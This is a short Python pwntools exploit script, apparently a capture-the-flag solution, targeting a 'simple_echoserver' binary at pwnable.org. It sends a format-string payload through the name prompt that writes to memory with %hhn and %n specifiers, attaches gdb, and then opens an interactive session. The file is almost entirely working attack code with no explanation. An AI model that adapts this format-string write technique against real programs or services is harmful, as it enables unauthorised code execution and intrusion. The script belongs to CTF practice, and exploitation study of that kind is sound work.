from pwn import *
import sys

HOST = 'pwnable.org'
PORT = 12020
LIBC = ELF("./libc.so.6",checksec = False)
if(len(sys.argv)>1):
    io=remote(HOST,PORT)
    context.noptrace=True
else:
    io=process('./simple_echoserver',env = {"LD_PRELOAD" : "./libc.so.6"},stderr = open('/dev/null','w+'))

reu = lambda a : io.recvuntil(a)
sla = lambda a,b : io.sendlineafter(a,b)
sl = lambda a : io.sendline(a)
rel = lambda : io.recvline()
sa = lambda a,b : io.sendafter(a,b)
re = lambda a : io.recv(a)
s = lambda a : io.send(a)
#b*0x5555555554d0

#'%*76$d' + '%73$n')

if __name__=="__main__":
    gdb.attach(io,"""
            set args 2>/dev/null
            b fprintf
            c
            """)
    sla('name: ','%155c' + '%7$hhn' + '%58600c' + '%50$hn' + '%*19$d' + '%7$n')
    sla('phone: ','12')
    sla('yourself!\n','a')
    sl('~.')
    io.interactive()
